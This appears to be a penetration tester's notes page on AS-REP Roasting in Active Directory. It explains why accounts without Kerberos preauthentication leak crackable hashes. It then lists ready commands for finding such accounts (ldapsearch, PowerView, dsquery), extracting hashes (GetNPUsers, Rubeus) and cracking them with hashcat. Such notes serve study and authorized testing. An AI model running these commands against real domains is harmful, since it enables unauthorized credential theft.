---
Primary_category: "[[KERBEROS]]"
title: ASREPROAST
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
  - AD
  - Windows
  - Kerberos
  - ldapsearch
  - ASREPRoast
  - HashCracking
  - Impacket
  - Kerbrute
cssclasses:
---

###### PRIMARY CATEGORY → [[KERBEROS]]

#### *Theory*

Any domain user account with the ***DONT_REQ_PREAUTH*** flag set in its *UserAccountControl* attribute is susceptible to this attack

![[ASREPROAST-20251105170323604.webp|150]]

> ***Zoom in***

This flag is disabled by default when a principal is created. If is set, any *kerberos client* who request a *Ticket Granting Ticket* for the given principal will not be asked for a *Kerberos Preauthentication*

That said, let's delve a bit more into this process

Usually, when a *kerberos client* initiates an *AS Exchange* by requesting a *Ticket Granting Ticket (TGT)* for a certain principal, indicated in the *AS_REQ*'s *ClientName* field, the *KDC's AS* checks for its *UserAccountControl* attribute in order to verify whether this user requires *Kerberos Preauthentication* or not

If so, the *KDC* responds with a **`KRB5KDC_ERR_PREAUTH_REQUIRED`** indicating that the client must provide authentication data related to the principal for whom the *TGT* is requested

![[ASREPROAST-20251105161748543.webp|300]]

> ***Zoom in***

In this case, the client generates a *timestamp*, to avoid replay attacks, and encrypts it with a key derived from the given principal. It sends this information within an *AS_REQ* along with other data

![[ASREPROAST-20251105162316552.webp|300]]

> ***Zoom in***

Then, the *AS* retrieves all the user account's keys, namely, the *NT hash* and *AES keys*, either from memory *(i.e. [[LSASS|lsass]])* or from the *NTDS.dit* database and tries to decrypt the provided *timestamp* with one of them. If so, the client has proven that he has the principal password, and therefore, the authentication is successful

After this validation, the *AS* creates an structure containing information about the requested *clientName*, called *Privilege Attribute Certificate (PAC)*, and generates a *session key*. Both elements are stored within a *TGT* section called *enc-part*, which is encrypted with a key derived from the password of the *KRBTGT* service account

Similarly, it also generates an *encrypted-part* alongside with the *TGT*. The former is encrypted with the same key that the client used to encrypt the *timestamp*

![[ASREPROAST-20251105164319982.webp|300]]

> ***Zoom in***

In the other hand, if the *kerberos client* initiates an *AS Exchange* to request a *TGT* for a principal which does not have the ***DONT_REQ_PREAUTH*** flag set, the *AS* will first verify this statement and, then, it will create both the *TGT* and the *encrypted-part* and send them to the client

Remember that the *encrypted-part* is encrypted with a key derived from the password of the given principal *(clientName)*. Therefore, an operator could parse this data and convert it to a *hashcat* format in order to try crack this hash and obtain the plain password of the *kerberos principal*

---

#### *Enumeration - UNIX-like*

##### *Ldapsearch*

> ***[Ldapsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)***

> ***UserAccountControl OID →* `1.2.840.113556.1.4.803`**

> ***LDAP Filter →* `'(&(ObjectCategory=person)(ObjectClass=user)(UserAccountControl:1.2.840.113556.1.4.803:=4194304))'`**

```bash
ldapsearch -LLL -x -H 'ldap://<TARGET>' -D '<USER>@<DOMAIN>' -w '<PASSWD>' -b 'DC=<DOMAIN>,DC=<TLD>' '(&(ObjectCategory=person)(ObjectClass=user)(UserAccountControl:1.2.840.113556.1.4.803:=4194304))' samAccountName dn userprincipalName
```

##### *Go-Windapsearch*

> ***[Go-Windapsearch](https://github.com/ropnop/go-windapsearch)***

> ***Module → * `Custom`**

```bash
windapsearch --domain '<DOMAIN>' --dc '<DC>' --username '<USER>' --password '<PASSWD>' --module custom --filter '(&(ObjectCategory=person)(ObjectClass=User)(UserAccountControl:1.2.840.113556.1.4.803:=4194304))' --attrs samAccountName
```

---

#### *Enumeration - Windows*

##### *Powershell AD Module*

> ***[Powershell AD Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps)***

> ***Get-ADUser***

```powershell
Get-ADUser -LDAPFilter '(&(ObjectCategory=person)(UserAccountControl:1.2.840.113556.1.4.803:=4194304))' -Properties * | Select samAccountName, distinguishedName
```

##### *Powerview*

> ***[Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)***

> ***Get-DomainUser + UACFilter***

```powershell
Get-DomainUser -UACFilter 'DONT_REQ_PREAUTH' | Select samAccountName, distinguishedName
```

> ***Get-DomainUser + PreAuthNotRequired***

```powershell
Get-DomainUser -PreAuthNotRequired | Select samAccountName, distinguishedName
```

##### *DSquery*

> ***[DSquery](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)***

> ***Local privileges required***

```bash
dsquery * -Filter "(&(ObjectCategory=person)(ObjectClass=user)(UserAccountControl:1.2.840.113556.1.4.803:=4194304))" -Attr samAccountName distinguishedName userPrincipalName
```

---

#### *ASREPRoasting - UNIX-like*

##### *Impacket's GetNPUsers.py*

> ***[GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)***

> ***No domain credentials needed***

###### *One Domain User Account*

```bash
GetNPUsers.py -dc-ip <TARGET> -no-pass '<DOMAIN>/<USER>'
```

###### *Domain User Account List*

```bash
GetNPUsers.py -dc-ip <TARGET> -outputfile <OUTPUTFILE> -no-pass -usersfile <USER_LIST> '<DOMAIN>/'
```

##### *Kerbrute*

> ***[Kerbrute](https://github.com/ropnop/kerbrute)***

###### *One Domain User Account*

```bash
kerbrute userenum --dc <TARGET> --domain '<DOMAIN>' <(echo -n "<USER>")
```

###### *Domain User Account List*

```bash
kerbrute userenum --dc <TARGET> --domain '<DOMAIN>' <USERLIST>
```

---

#### *ASREPRoasting - Windows*

##### *Rubeus*

> ***[Rubeus](https://github.com/GhostPack/Rubeus)***

```bash
.\Rubeus.exe asreproast /user:<USER> /domain:<DOMAIN> /format:hashcat /nowrap
```

---

#### *Cracking*

#####  *Hashcat*

> ***Hashcat Type → 18200***

###### *Usage*

```bash
hashcat --force -O --attack-mode 0 --hash-type 18200 <HASH> <WORDLIST>
```

###### *Display Result*

```bash
hashcat --force -O --attack-mode 0 --hash-type 18200 <HASH> <WORDLIST> --show
```